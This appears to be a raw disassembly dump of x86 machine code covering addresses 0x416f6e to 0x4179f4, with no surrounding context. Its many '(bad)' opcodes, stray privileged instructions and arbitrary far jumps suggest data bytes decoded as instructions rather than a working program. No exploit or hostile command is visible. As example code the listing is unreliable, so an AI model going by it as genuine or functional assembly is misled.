  416f6e:	and    al,0xdb
  416f70:	ins    DWORD PTR es:[edi],dx
  416f71:	dec    DWORD PTR [edi]
  416f73:	xor    ecx,ebp
  416f75:	sub    al,0x7f
  416f77:	jg     0x416f03
  416f79:	imul   edi,DWORD PTR [esi-0x29],0xffffffc1
  416f7d:	dec    ebx
  416f7e:	jmp    0xd5a98480
  416f83:	xchg   ebp,eax
  416f84:	aad    0xba
  416f86:	fisubr DWORD PTR [ecx-0x21]
  416f89:	test   DWORD PTR [edx+0x4a],0x772bb410
  416f90:	rol    BYTE PTR [eax-0x23],1
  416f93:	mov    esi,0x747b0f1d
  416f98:	je     0x416f60
  416f9a:	std    
  416f9b:	sbb    al,0x97
  416f9d:	arpl   WORD PTR [edx-0x49],ax
  416fa0:	lods   al,BYTE PTR ds:[esi]
  416fa1:	aas    
  416fa2:	out    0x4d,al
  416fa4:	fs mov bl,0xed
  416fa7:	and    DWORD PTR [edi+ebp*4-0x152f63a7],edx
  416fae:	dec    esp
  416faf:	(bad)  
  416fb0:	fild   DWORD PTR [esi-0x3b]
  416fb3:	inc    ecx
  416fb4:	mov    ds:0x6bb3ed7b,al
  416fb9:	pop    ds
  416fba:	imul   bh
  416fbc:	mov    bh,0xc4
  416fbe:	popa   
  416fbf:	in     al,dx
  416fc0:	arpl   WORD PTR [eax+0x2a370b81],dx
  416fc6:	mov    esp,0x4b473f17
  416fcb:	mov    al,ds:0x2e24525b
  416fd0:	xchg   ebx,eax
  416fd1:	xchg   ebx,eax
  416fd2:	mov    ecx,DWORD PTR [edi+0x40b44f44]
  416fd8:	pop    ebx
  416fd9:	std    
  416fda:	leave  
  416fdb:	cmp    al,0xd9
  416fdd:	adc    dh,BYTE PTR [ecx+0x1ca1f1b9]
  416fe3:	pop    edi
  416fe4:	aam    0xf
  416fe6:	retf   0xf9c8
  416fe9:	jae    0x416f76
  416feb:	(bad)  
  416fec:	jnp    0x416fd0
  416fee:	adc    esp,0xffffff95
  416ff1:	push   ebp
  416ff2:	add    edx,edx
  416ff4:	inc    edx
  416ff5:	test   eax,0x3a4fb5cb
  416ffa:	les    ebp,FWORD PTR [edx]
  416ffc:	imul   edx,DWORD PTR [edx-0x24],0x9dd9211c
  417003:	into   
  417004:	pop    edi
  417005:	jno    0x416fc6
  417007:	inc    ebp
  417008:	mov    BYTE PTR [edi-0x78],0x0
  41700c:	adc    DWORD PTR [esi+0x32f4e2],0x0
	...
  417072:	add    BYTE PTR [eax],al
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    ecx,DWORD PTR [ecx]
  417081:	xor    edi,DWORD PTR [eax]
  417083:	mov    cl,0x81
  417085:	repz add BYTE PTR [eax],al
  417088:	add    eax,0xde000001
  41708d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41708e:	add    DWORD PTR [esp+ecx*2+0x69f7f8e8],esi
  417095:	fwait
  417096:	add    al,0xa2
  417098:	setnp  ah
  41709b:	cmp    al,0xc4
  41709d:	daa    
  41709e:	loope  0x417055
  4170a0:	sbb    ecx,DWORD PTR [esi-0x10]
  4170a3:	cdq    
  4170a4:	fs dec edi
  4170a6:	mov    esp,0xb69569fc
  4170ab:	stc    
  4170ac:	std    
  4170ad:	xchg   ecx,eax
  4170ae:	inc    ebx
  4170af:	mov    DWORD PTR [ecx],ebx
  4170b1:	jnp    0x417098
  4170b3:	jae    0x4170bc
  4170b5:	pop    esp
  4170b6:	mov    edx,0xf4bda3b
  4170bb:	fisubr DWORD PTR [ebp+0x56cebe47]
  4170c1:	jmp    0x5321:0xe1e3a3a6
  4170c8:	in     al,0x7e
  4170ca:	dec    eax
  4170cb:	je     0x41707f
  4170cd:	hlt    
  4170ce:	mov    bp,ax
  4170d1:	push   ds
  4170d2:	into   
  4170d3:	adc    DWORD PTR [ebx+0x66b9430c],eax
  4170d9:	mov    ?,WORD PTR [ecx]
  4170db:	ret    0x3f7f
  4170de:	lock and ecx,DWORD PTR [ecx-0x40]
  4170e2:	shl    BYTE PTR [ebx-0x40],1
  4170e5:	(bad)
  4170e8:	inc    esp
  4170e9:	xlat   BYTE PTR ds:[ebx]
  4170ea:	lods   al,BYTE PTR ds:[esi]
  4170eb:	int3   
  4170ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170ed:	mov    BYTE PTR [ecx+esi*8],dl
  4170f0:	popa   
  4170f1:	fldcw  WORD PTR [eax+eax*4]
  4170f4:	sbb    al,0x5a
  4170f6:	sbb    dh,BYTE PTR [ecx+0x115d36ee]
  4170fc:	paddw  mm1,QWORD PTR [ebx]
  4170ff:	cli    
  417100:	jnp    0x41713b
  417102:	sub    DWORD PTR [esi+0x7e],edx
  417105:	xchg   ecx,eax
  417106:	pop    ebx
  417107:	mov    BYTE PTR [ebx+0x3093110c],cl
  41710d:	jle    0x4170ad
  41710f:	stos   BYTE PTR es:[edi],al
  417110:	pop    edx
  417111:	dec    ecx
  417112:	jge    0x41713d
  417114:	push   cs
  417115:	or     eax,0xca7188ec
  41711a:	pop    es
  41711b:	mov    ebp,0x2418c450
  417120:	mov    ch,0xa5
  417122:	into   
  417123:	add    eax,DWORD PTR [eax+0x2c3dfbe6]
  417129:	push   0x845666fa
  41712e:	retf   
  41712f:	add    esi,DWORD PTR [ecx+eiz*8]
  417132:	mov    ds:0x506299e7,eax
  417137:	jmp    0xb03538f3
  41713c:	jbe    0x4170d0
  41713e:	mov    ch,0xa6
  417140:	ss into 
  417142:	lahf   
  417143:	aam    0xe4
  417145:	xor    bl,BYTE PTR [esi+0x9]
  417148:	rcr    BYTE PTR [edx+0x683d4719],0xc2
  41714f:	les    ebx,FWORD PTR [ebx]
  417151:	push   ss
  417152:	pop    ss
  417153:	xor    eax,0x8c1e0673
  417158:	adc    BYTE PTR [ebp+edi*4+0x5700a110],al
  41715f:	jns    0x41713c
  417161:	adc    eax,0xedc71a6
  417166:	cmp    bh,BYTE PTR [ebx+eiz*2-0x19]
  41716a:	adc    bh,BYTE PTR [edx]
  41716c:	pop    esi
  41716d:	mov    bl,0xf5
  41716f:	jns    0x4171ae
  417171:	pop    esp
  417172:	scas   eax,DWORD PTR es:[edi]
  417173:	jbe    0x41711b
  417175:	test   eax,0x601e25e9
  41717a:	pusha  
  41717b:	call   0x9002:0x251e5ee9
  417182:	xor    eax,0x8e939497
  417187:	dec    ecx
  417188:	inc    esp
  417189:	pushf  
  41718a:	(bad)  
  41718b:	repz ja 0x417111
  41718e:	pop    ebp
  41718f:	bound  ecx,QWORD PTR [ebx]
	...
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	dec    eax
  417201:	cli    
  417202:	loopne 0x41719b
  417204:	xchg   ah,dh
  417206:	add    BYTE PTR [eax],al
  417208:	add    eax,0xf1000001
  41720d:	mov    eax,ds:0x956761be
  417212:	lods   al,BYTE PTR ds:[esi]
  417213:	outs   dx,DWORD PTR ds:[esi]
  417214:	jae    0x4171cc
  417216:	lods   al,BYTE PTR ds:[esi]
  417217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417218:	data16 mov dl,0x25
  41721b:	adc    DWORD PTR [esi],esp
  41721d:	push   esi
  41721e:	mov    edx,0x255fbf9d
  417223:	aaa    
  417224:	rol    BYTE PTR [ebx-0x1e],0xaf
  417228:	pusha  
  417229:	mov    esp,0x9f8acbb1
  41722e:	mov    bl,0x7d
  417230:	adc    BYTE PTR [ebx+0x22],bl
  417233:	bound  esi,QWORD PTR [ebx+ebp*2-0x20]
  417237:	imul   esi,DWORD PTR [edi],0x5b
  41723a:	js     0x41726c
  41723c:	pop    ebp
  41723d:	jecxz  0x417283
  41723f:	adc    BYTE PTR [edi+0xf0ed978],dh
  417245:	cmp    eax,0xcf9cdf83
  41724a:	mov    ch,0xd6
  41724c:	int3   
  41724d:	xchg   edx,eax
  41724e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41724f:	stos   BYTE PTR es:[edi],al
  417250:	scas   al,BYTE PTR es:[edi]
  417251:	call   0x801e:0x4db93201
  417258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417259:	icebp  
  41725a:	or     DWORD PTR [eax-0x6e340599],edx
  417260:	cmp    ebx,edi
  417262:	dec    ebx
  417263:	xchg   ecx,eax
  417264:	xchg   esi,eax
  417265:	mov    esp,DWORD PTR [eax+eiz*1]
  417268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417269:	and    eax,0x1f77759
  41726e:	popf   
  41726f:	pop    es
  417270:	pop    ss
  417271:	add    al,0x36
  417273:	mov    ah,0xb6
  417275:	push   esi
  417276:	(bad)  
  417277:	adc    eax,0x5d3babaa
  41727c:	(bad)  
  41727d:	test   eax,0x7fbd0611
  417282:	in     al,dx
  417283:	(bad)  
  417284:	data16 xchg BYTE PTR [edi+ecx*2],ch
  417288:	jb     0x4172fc
  41728a:	out    dx,al
  41728b:	mov    edi,0x50d41f06
  417290:	pop    es
  417291:	popf   
  417292:	sti    
  417293:	addr16 cmp ebx,0xffffffd6
  417297:	dec    esi
  417298:	or     eax,0x929777bc
  41729d:	inc    esi
  41729e:	adc    DWORD PTR [ecx+edi*8+0x49],ecx
  4172a2:	jb     0x4172e8
  4172a4:	int3   
  4172a5:	mov    esi,0x21c0086a
  4172aa:	lods   al,BYTE PTR ds:[esi]
  4172ab:	loop   0x41731c
  4172ad:	jmp    0x33cd:0x831e
  4172b3:	push   0x1f
  4172b5:	mov    ch,0x8b
  4172b7:	jle    0x41727d
  4172b9:	sub    bl,BYTE PTR [ebp-0x1a36f8f9]
  4172bf:	sahf   
  4172c0:	fist   DWORD PTR [edx]
  4172c2:	(bad)  
  4172c3:	jmp    0x1c0bc8e7
  4172c8:	(bad)  
  4172c9:	cmp    ah,bl
  4172cb:	adc    ah,BYTE PTR [edi]
  4172cd:	cli    
  4172ce:	inc    ebp
  4172cf:	jge    0x4172a6
  4172d1:	jg     0x4172b7
  4172d3:	repnz mov eax,ds:0x550e0053
  4172d9:	pop    ds
  4172da:	jbe    0x4172dd
  4172dc:	mov    ebx,0xad589129
  4172e1:	outs   dx,BYTE PTR ds:[esi]
  4172e2:	inc    ebp
  4172e3:	adc    edx,ebx
  4172e5:	(bad)  
  4172e6:	imul   ebx,DWORD PTR [ebp-0x39],0x11
  4172ea:	jge    0x417307
  4172ec:	mov    bh,0x20
  4172ee:	cmp    al,0x76
  4172f0:	jns    0x41736a
  4172f2:	test   BYTE PTR [edx+eiz*2],ch
  4172f5:	loopne 0x417359
  4172f7:	(bad)  
  4172f8:	mov    esp,0x93af45ac
  4172fd:	ins    BYTE PTR es:[edi],dx
  4172fe:	cdq    
  4172ff:	xchg   esi,eax
  417300:	xchg   BYTE PTR [ecx],cl
  417302:	sbb    bl,BYTE PTR [edi+0x25a0ac06]
  417308:	pop    ebp
  417309:	pop    ebp
  41730a:	mov    ch,0x73
  41730c:	mov    ?,WORD PTR [eax-0x21]
  41730f:	inc    edi
  417310:	cmp    al,BYTE PTR [eax]
	...
  417372:	add    BYTE PTR [eax],al
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	gs sub al,0x2e
  417382:	jmp    0x500:0xf58b9a
  417389:	add    DWORD PTR [eax],eax
  41738b:	add    BYTE PTR [esi+eiz*4],ch
  41738e:	push   ds
  41738f:	sub    DWORD PTR [edi],esi
  417391:	loop   0x41731b
  417393:	dec    ecx
  417394:	xchg   ecx,eax
  417395:	dec    esp
  417396:	add    al,0x9f
  417398:	xchg   dl,al
  41739a:	clc    
  41739b:	xchg   edx,ecx
  41739d:	ja     0x417349
  41739f:	or     al,0xcb
  4173a1:	xlat   BYTE PTR ds:[ebx]
  4173a2:	jle    0x417393
  4173a4:	fst    DWORD PTR [ebx+0xee466e4]
  4173aa:	jb     0x41735e
  4173ac:	push   ss
  4173ad:	jmp    0x2f8592d5
  4173b2:	xor    ah,BYTE PTR ss:[esi-0x3a0adaaf]
  4173b9:	xchg   ebp,ebx
  4173bb:	push   eax
  4173bc:	inc    ecx
  4173bd:	push   cs
  4173be:	pop    edi
  4173bf:	xchg   DWORD PTR [ecx+ebx*4-0x272aab40],ebx
  4173c6:	ds cs popa 
  4173c9:	(bad)  
  4173ca:	inc    BYTE PTR [esi+0x7d]
  4173cd:	mov    cl,0x39
  4173cf:	jl     0x417386
  4173d1:	pop    esi
  4173d2:	xor    DWORD PTR [edx+ebp*4+0x6ab91760],0xfffffff6
  4173da:	and    BYTE PTR [edx+0x4ceba849],bl
  4173e0:	xchg   edi,eax
  4173e1:	pop    edx
  4173e2:	jb     0x417417
  4173e4:	and    edx,DWORD PTR [edx+0x12aaa13c]
  4173ea:	call   0xed78876c
  4173ef:	dec    esp
  4173f0:	or     al,0x42
  4173f2:	add    BYTE PTR [edx-0x5a],dh
  4173f5:	js     0x4173da
  4173f7:	inc    esp
  4173f8:	dec    esi
  4173f9:	xor    esp,DWORD PTR [eax]
  4173fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173fc:	repnz mov BYTE PTR [esi],bh
  4173ff:	pop    ebp
  417400:	and    DWORD PTR [eax],edi
  417402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417403:	imul   BYTE PTR [edi-0x5abcc3f4]
  417409:	add    bh,al
  41740b:	test   eax,0x5c781988
  417410:	add    eax,0x4f958d4e
  417415:	jl     0x417449
  417417:	lahf   
  417418:	cmp    al,0x7
  41741a:	les    edx,FWORD PTR [ebx+0x1f407ff3]
  417420:	clc    
  417421:	ror    bl,1
  417423:	mov    bh,0x7c
  417425:	mov    al,ds:0x9c6a5c0c
  41742a:	stc    
  41742b:	inc    ebx
  41742c:	cmp    dh,BYTE PTR [ecx-0x5f]
  41742f:	scas   al,BYTE PTR es:[edi]
  417430:	mov    esi,0x4e2c59e7
  417435:	(bad)  
  417436:	cdq    
  417437:	sub    edx,DWORD PTR [esi+0x7d]
  41743a:	sub    ebx,DWORD PTR [ecx+0x7d]
  41743d:	cwde   
  41743e:	and    DWORD PTR [ebx-0x291b0b33],eax
  417444:	adc    DWORD PTR [ecx],0x2f492a9d
  41744a:	rcl    DWORD PTR [esi],0x6e
  41744d:	mov    esi,0xbe69b5e1
  417452:	sub    edx,DWORD PTR [ecx+0x40ea55ea]
  417458:	push   esp
  417459:	mov    ds:0xafd1e0cb,al
  41745e:	call   0xb99b598f
  417463:	xchg   dl,al
  417465:	add    al,0x63
  417467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417468:	xor    cl,BYTE PTR [edi+0x2eabd72]
  41746e:	js     0x4174b8
  417470:	jmp    0x5d04:0x3a6e86e3
  417477:	add    eax,0xa1982543
  41747c:	mov    ah,0x75
  41747e:	popa   
  41747f:	pop    ss
  417480:	dec    edx
  417481:	pop    esi
  417482:	out    0x88,al
  417484:	cmp    eax,0x29945436
  417489:	sub    al,BYTE PTR [ebp+0x42]
  41748c:	scas   al,BYTE PTR es:[edi]
  41748d:	imul   DWORD PTR [ebp+0x60]
  417490:	add    BYTE PTR [bx+si],al
	...
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	sub    eax,0x909da8a5
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    eax,0x2a000001
  41750d:	mov    cl,0x7c
  41750f:	add    BYTE PTR [ecx-0x3ae58c5e],0x48
  417516:	shr    DWORD PTR [ebx+0x16e1d9e8],1
  41751c:	loopne 0x417553
  41751e:	push   esi
  41751f:	pop    esi
  417520:	mov    ah,0xcc
  417522:	lea    ebp,[ecx]
  417524:	out    0x70,al
  417526:	call   0xf8c7:0x9b43234e
  41752d:	jmp    0xc1f1:0x2cda97b6
  417534:	push   esi
  417535:	and    dh,BYTE PTR [ebx+0xf]
  417538:	cli    
  417539:	pop    es
  41753a:	pop    esi
  41753b:	inc    eax
  41753c:	sbb    dl,0xcd
  41753f:	sti    
  417540:	inc    DWORD PTR [edx+edi*1-0x76]
  417544:	aam    0xc
  417546:	push   esp
  417547:	out    dx,eax
  417548:	or     ah,0x74
  41754b:	sub    eax,0x152a4eeb
  417550:	sbb    bh,BYTE PTR [ebp+0x71aaa1c1]
  417556:	cmp    ebp,edx
  417558:	mov    edx,0x920a7a2c
  41755d:	lahf   
  41755e:	mov    cl,0x43
  417560:	xor    ecx,edx
  417562:	add    bh,BYTE PTR [esi+0x2262ba2a]
  417568:	lods   ax,WORD PTR ds:[esi]
  41756a:	pop    esp
  41756b:	fisubr DWORD PTR [ebx+0x35]
  41756e:	stos   BYTE PTR es:[edi],al
  41756f:	daa    
  417570:	mov    edx,0xf8b4b73a
  417575:	mov    WORD PTR [ebp-0x19],es
  417578:	push   cs
  417579:	ds sbb al,0x11
  41757c:	ins    BYTE PTR es:[edi],dx
  41757d:	sub    al,0xe1
  41757f:	mov    ds:0x7fbe40f9,al
  417584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417585:	add    dh,BYTE PTR [edx+0x45444cdc]
  41758b:	mov    esi,0xf306e4ae
  417590:	or     ebp,DWORD PTR [ebx-0x6f]
  417593:	xor    al,al
  417595:	or     al,0xed
  417597:	mov    esi,0x429efa1a
  41759c:	sti    
  41759d:	inc    edi
  41759e:	push   ecx
  41759f:	ret    0xe480
  4175a2:	daa    
  4175a3:	popf   
  4175a4:	(bad)  
  4175a5:	push   edi
  4175a6:	fiadd  DWORD PTR [ecx*4-0x3b5cdb45]
  4175ad:	xor    ecx,ebx
  4175af:	jmp    0x417547
  4175b1:	fisub  WORD PTR fs:[ebx]
  4175b4:	mov    ebx,0x90a25395
  4175b9:	lahf   
  4175ba:	retf   0xc61c
  4175bd:	push   ds
  4175be:	scas   al,BYTE PTR es:[edi]
  4175bf:	rcl    DWORD PTR [edx-0x34],cl
  4175c2:	hlt    
  4175c3:	outs   dx,BYTE PTR ds:[esi]
  4175c4:	sbb    BYTE PTR [ebx*1+0x72f01998],0x96
  4175cc:	lods   eax,DWORD PTR ds:[esi]
  4175cd:	mul    DWORD PTR [ecx+esi*4-0x55a0475e]
  4175d4:	mov    bl,0x72
  4175d6:	mov    bh,0x19
  4175d8:	pop    eax
  4175d9:	adc    dh,BYTE PTR [edi+0x22]
  4175dc:	nop
  4175dd:	in     al,dx
  4175de:	xor    BYTE PTR [ecx],cl
  4175e0:	add    DWORD PTR [esi+0x6e],0xffffffa6
  4175e4:	and    bl,ch
  4175e6:	enter  0x697b,0x6b
  4175ea:	dec    ecx
  4175eb:	xchg   esi,eax
  4175ec:	in     eax,dx
  4175ed:	xchg   DWORD PTR [edx-0x32],edi
  4175f0:	pusha  
  4175f1:	enter  0x208f,0xb9
  4175f5:	jmp    0x62ff:0x51137864
  4175fc:	imul   ebx,DWORD PTR [eax],0x19fa0613
  417602:	ds call 0xf0d8afd9
  417608:	xchg   ecx,eax
  417609:	push   0xffffffd7
  41760b:	xchg   BYTE PTR [ebp-0x30],al
  41760e:	and    eax,0xd35c
	...
  417673:	add    BYTE PTR [ecx-0x20b02c99],ch
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fimul  DWORD PTR [edx]
  417681:	mov    ebp,0xf795b46a
  417686:	add    BYTE PTR [eax],al
  417688:	add    eax,0xe8000001
  41768d:	or     al,BYTE PTR [esi-0x785d60f7]
  417693:	dec    ebp
  417694:	in     eax,0xae
  417696:	push   0x76
  417698:	push   esi
  417699:	push   ebx
  41769a:	jge    0x417715
  41769c:	into   
  41769d:	scas   eax,DWORD PTR es:[edi]
  41769e:	mov    eax,ds:0x1a7244c0
  4176a3:	loope  0x4176b4
  4176a5:	xor    BYTE PTR [edx-0x71],0x19
  4176a9:	aas    
  4176aa:	ins    DWORD PTR es:[edi],dx
  4176ab:	xchg   edx,esi
  4176ad:	rol    BYTE PTR [edx-0x703202c1],0xff
  4176b4:	test   DWORD PTR [edi+ebp*4-0x231812c6],edi
  4176bb:	jmp    0xd1713aa4
  4176c0:	bound  ebx,QWORD PTR [eax-0x626a5f32]
  4176c6:	push   ss
  4176c7:	push   edx
  4176c8:	xlat   BYTE PTR ds:[ebx]
  4176c9:	sbb    BYTE PTR [ecx+0x6a],0x44
  4176cd:	cmp    bl,al
  4176cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176d0:	ror    DWORD PTR [ecx+eiz*1+0x35c2bfc6],1
  4176d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176d8:	jns    0x417701
  4176da:	es cld 
  4176dc:	push   0xfef35783
  4176e1:	xchg   esp,eax
  4176e2:	pop    esp
  4176e3:	xchg   ecx,eax
  4176e4:	daa    
  4176e5:	ds cmp eax,0x36d80ae0
  4176eb:	shl    DWORD PTR [edi+esi*2],0x4b
  4176ef:	cmp    BYTE PTR [ecx-0x45],bl
  4176f2:	sbb    eax,0x972dd683
  4176f7:	shr    ebp,cl
  4176f9:	cmp    eax,DWORD PTR ds:0x10ae6f3d
  4176ff:	mov    BYTE PTR [edx],ch
  417701:	aaa    
  417702:	stc    
  417703:	pop    eax
  417704:	(bad)  
  417706:	(bad)  
  417707:	(bad)  
  417708:	outs   dx,DWORD PTR ds:[esi]
  417709:	sub    DWORD PTR [ebx-0x65615b6f],edi
  41770f:	push   ebp
  417710:	jne    0x417710
  417712:	clc    
  417713:	lods   eax,DWORD PTR ds:[esi]
  417714:	xchg   ebp,eax
  417715:	or     bl,ch
  417717:	and    eax,0xa0d33646
  41771c:	pop    ds
  41771d:	push   ebx
  41771e:	pop    ss
  41771f:	ds and eax,0x83198d5
  417725:	cmp    bl,BYTE PTR [edi+0x7cada125]
  41772b:	imul   ecx,edi,0x11
  41772e:	loope  0x4176f4
  417730:	ror    DWORD PTR [esi+0x1b],1
  417733:	stos   DWORD PTR es:[edi],eax
  417734:	stos   BYTE PTR es:[edi],al
  417735:	xchg   edx,eax
  417736:	mov    eax,0x866ea684
  41773b:	stc    
  41773c:	cli    
  41773d:	js     0x417752
  41773f:	inc    eax
  417740:	test   al,0xf6
  417742:	dec    eax
  417743:	popa   
  417744:	pop    ss
  417745:	mov    ah,0xd0
  417747:	jb     0x4176f0
  417749:	cmp    al,0xfc
  41774b:	pop    ebx
  41774c:	push   edx
  41774d:	pop    ebp
  41774e:	pop    ds
  41774f:	lock pop esp
  417751:	and    edx,DWORD PTR [edi]
  417753:	adc    al,0xd6
  417755:	dec    eax
  417756:	inc    esp
  417757:	jmp    0x4176dc
  417759:	push   es
  41775a:	es dec esp
  41775c:	cmp    eax,0xa5c5506f
  417761:	mov    BYTE PTR [ebp-0x2d3e76d6],ah
  417767:	jg     0x417781
  417769:	mov    ebp,0x462f360d
  41776e:	lods   al,BYTE PTR ds:[esi]
  41776f:	lock jmp 0x417705
  417772:	hlt    
  417773:	loop   0x41773a
  417775:	xchg   edi,eax
  417776:	cmp    BYTE PTR [edx-0x68c5fce7],al
  41777c:	in     al,dx
  41777d:	ret    
  41777e:	lahf   
  41777f:	cmp    dl,dl
  417781:	jmp    0x474b:0x486d265c
  417788:	call   0xb560:0xb6fd7785
  41778f:	mov    ebx,0x4b
	...
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	inc    ebp
  417801:	dec    esp
  417802:	fabs   
  417804:	call   0x1:0x50000f8
  41780b:	add    BYTE PTR [ebx],ah
  41780d:	adc    eax,0x6b716ef1
  417812:	popf   
  417813:	ss test eax,0x938236ed
  417819:	aas    
  41781a:	out    0xb,al
  41781c:	aam    0x73
  41781e:	jno    0x4177fc
  417820:	xchg   esp,eax
  417821:	dec    edi
  417822:	pop    edi
  417823:	mov    ah,0x54
  417825:	push   ecx
  417826:	mov    al,0xa1
  417828:	sbb    eax,0x6b26b191
  41782d:	out    dx,eax
  41782e:	xor    ah,ah
  417830:	test   DWORD PTR [ecx-0x60cd825a],esi
  417836:	fs mov ecx,0xa86282b2
  41783c:	inc    edi
  41783d:	mov    dh,BYTE PTR [eiz*1+0x20848de]
  417844:	cmp    al,bl
  417846:	sub    cl,BYTE PTR [esi+ebp*1-0x15c2153]
  41784d:	cmp    BYTE PTR [edi-0x16],cl
  417850:	adc    ebx,DWORD PTR [esi+esi*8]
  417853:	dec    esp
  417854:	rcr    DWORD PTR [esi-0x44886b0],0x28
  41785b:	lods   eax,DWORD PTR ds:[esi]
  41785c:	fwait
  41785d:	inc    eax
  41785e:	push   ebp
  41785f:	out    0x74,al
  417861:	ret    
  417862:	ds sti 
  417864:	gs (bad) 
  417866:	push   ecx
  417867:	pop    edx
  417868:	dec    eax
  417869:	add    DWORD PTR [ebx],edi
  41786b:	dec    ebp
  41786c:	xchg   BYTE PTR [edi-0x53],cl
  41786f:	xor    BYTE PTR [esi-0xc],dl
  417872:	and    al,0xe2
  417874:	repz jb 0x417824
  417877:	push   es
  417878:	and    DWORD PTR [ebx+0x48fd2c73],ebp
  41787e:	sahf   
  41787f:	add    al,0xf1
  417881:	pop    esi
  417882:	push   esp
  417883:	push   ecx
  417884:	ficom  WORD PTR gs:[esi-0x63c11ef5]
  41788b:	sbb    bl,BYTE PTR ds:0xdee0e0d8
  417891:	xchg   ebx,eax
  417892:	pusha  
  417893:	stos   BYTE PTR es:[edi],al
  417894:	ins    BYTE PTR es:[edi],dx
  417895:	jbe    0x4178f8
  417897:	or     edx,ebp
  417899:	test   al,0x20
  41789b:	mov    al,0x40
  41789d:	mov    edi,DWORD PTR [ebx+ecx*2-0x19]
  4178a1:	push   ecx
  4178a2:	in     al,dx
  4178a3:	fiadd  WORD PTR [eax+0x30]
  4178a6:	pop    esp
  4178a7:	nop
  4178a8:	jge    0x4178ae
  4178aa:	ror    edx,1
  4178ac:	aam    0x20
  4178ae:	add    al,0xf3
  4178b0:	jecxz  0x4178c7
  4178b2:	xor    eax,0x450a16b3
  4178b7:	rol    BYTE PTR [edx-0x5ce54d0a],cl
  4178bd:	jns    0x417857
  4178bf:	mov    edx,0xdacb2547
  4178c4:	scas   eax,DWORD PTR es:[edi]
  4178c5:	fstp   QWORD PTR [esi+0x1e]
  4178c8:	popf   
  4178c9:	xor    dh,BYTE PTR [ecx-0x53]
  4178cc:	lds    esp,FWORD PTR [esi-0xddab6f9]
  4178d2:	or     DWORD PTR [esp+ebp*1-0x69001e26],edx
  4178d9:	and    ecx,DWORD PTR [ecx]
  4178db:	out    dx,eax
  4178dc:	push   es
  4178dd:	mov    esp,0x833495a6
  4178e2:	inc    edi
  4178e3:	ja     0x4178f2
  4178e5:	dec    edx
  4178e6:	hlt    
  4178e7:	ret    
  4178e8:	xchg   ebx,eax
  4178e9:	out    dx,al
  4178ea:	cmp    eax,0x7f7a6a3c
  4178ef:	jge    0x41794c
  4178f1:	jg     0x4178da
  4178f3:	xchg   edx,eax
  4178f4:	inc    ecx
  4178f5:	rep stos BYTE PTR es:[edi],al
  4178f7:	mov    BYTE PTR ss:[ebp-0x19],ch
  4178fb:	jecxz  0x4178e4
  4178fd:	ja     0x4178e9
  4178ff:	cld    
  417900:	call   0xdd48:0xabf39dd2
  417907:	pop    edi
  417908:	repz rep outs dx,DWORD PTR ds:[esi]
  41790b:	je     0x4178bc
  41790d:	ror    DWORD PTR [esi+0xeca1],1
	...
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	rol    DWORD PTR [ecx-0x6607ffe],cl
  417986:	add    BYTE PTR [eax],al
  417988:	add    eax,0x18000001
  41798d:	mov    dl,0xa6
  41798f:	mov    ah,0xa1
  417991:	inc    edi
  417992:	dec    ecx
  417993:	adc    DWORD PTR [esi-0x15],edi
  417996:	(bad)  
  417998:	and    DWORD PTR [eax-0x19],ebp
  41799b:	inc    ebx
  41799c:	nop
  41799d:	push   cs
  41799e:	mov    ebx,0xb6d0ed22
  4179a3:	adc    BYTE PTR [edx-0x50],0xb8
  4179a7:	stos   BYTE PTR es:[edi],al
  4179a8:	cmc    
  4179a9:	mov    ebp,0xe10d4980
  4179ae:	nop
  4179af:	cmp    al,0x54
  4179b1:	mov    al,0x7e
  4179b3:	loope  0x41796c
  4179b5:	pop    ebp
  4179b6:	sbb    eax,0x839a1464
  4179bb:	pop    eax
  4179bc:	fbld   TBYTE PTR [edx]
  4179be:	aad    0x5d
  4179c0:	and    BYTE PTR [esi+esi*8-0x7ec1f432],dl
  4179c7:	loopne 0x4179eb
  4179c9:	push   0x53
  4179cb:	leave  
  4179cc:	sbb    edi,DWORD PTR [edx]
  4179ce:	xchg   ecx,eax
  4179cf:	fdiv   st,st(5)
  4179d1:	arpl   WORD PTR [eax+0x7a],dx
  4179d4:	cwde   
  4179d5:	pop    ebx
  4179d6:	mov    al,ds:0x93ffc67b
  4179db:	sbb    BYTE PTR [ebx+0x40],bl
  4179de:	in     eax,0x3a
  4179e0:	mov    cl,0x14
  4179e2:	or     DWORD PTR [eax-0x1a],esi
  4179e5:	fldenv [ebp+0x555589e4]
  4179eb:	push   0xfffffffb
  4179ed:	and    al,0xd9
  4179ef:	mov    ah,0x21
  4179f1:	stos   DWORD PTR es:[edi],eax
  4179f2:	int    0x2e
  4179f4:	cmp    al,0xe8
